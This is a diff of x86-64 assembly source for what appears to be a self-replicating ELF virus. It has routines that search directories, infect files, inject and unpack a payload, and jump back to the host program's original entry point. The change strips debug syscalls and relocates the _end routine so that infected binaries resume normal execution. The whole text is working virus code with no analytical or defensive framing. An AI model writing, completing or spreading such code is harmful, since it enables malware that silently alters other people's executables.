@@ -123,11 +123,6 @@ _inject:
 		sub rax, rdx; length - [packed_part - params]
 		push rax
 		pop rdx
-; = DEBUG
-;		mov rdi, rdx
-;		mov rax, 60
-;		syscall
-; =
 
 		call _unpack
 
@@ -136,7 +131,6 @@ _inject:
 		pop rsi
 
 		pop r8
-		pop rdx
 
 		push rsi ; save length
 
@@ -156,6 +150,7 @@ _inject:
 		push 11
 		pop rax
 		syscall
+		pop rdx
 
 		jmp _end
 
@@ -238,6 +233,23 @@ _ft_memcpy: ; (string rdi, string rsi, size_t rdx)
 	pop rcx
 ret
 
+_end:
+	xor rax, rax; = 0
+	cmp rax, [rel entry_inject]; if entry_inject is set we are in host
+	je _end_host
+
+	; infected file
+	push r8
+	pop rax
+
+	sub rax, [rel entry_inject]
+	add rax, [rel vaddr]
+
+	add rax, [rel entry_prg]
+	sub rax, [rel vaddr]
+
+	jmp rax
+
 ; ============================================================== pack from there
 _packed_part:
 _search_dir:
@@ -264,40 +276,6 @@ _search_dir:
 	jnz .loop_array_string
 	.return:
 ret
-
-_end:
-	xor rax, rax; = 0
-	cmp rax, [rel entry_inject]; if entry_inject is set we are in host
-	je _end_host
-
-	; infected file
-	push r8
-	pop rax
-
-	sub rax, [rel entry_inject]
-	add rax, [rel vaddr]
-
-; = DEBUG
-	mov rdi, [rel entry_prg]
-	mov rax, 11
-	syscall
-; =
-
-	mov rax, 60
-	syscall
-
-	add rax, [rel entry_prg]
-	sub rax, [rel vaddr]
-
-; = DEBUG
-	mov rdi, rax
-	push rax
-	mov rax, 9
-	syscall
-	pop rax
-; =
-
-	jmp rax
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
@@ -612,15 +590,7 @@ _infect_file: ; (string rdi, stat rsi)
 			pop r9
 
 			; ==		change rdx, rax, rdi
-; TODO: delete
-;			push rdi
 			add rdx, r9
-;			lea rax, [rel _packed_part]
-;			lea r9, [rel _start]
-;			sub rax, r9
-;			add rdx, rax
-;			pop rax
-;			add rax, rcx; end
 			pop rdi; mmap
 			mov rax, rdi
 
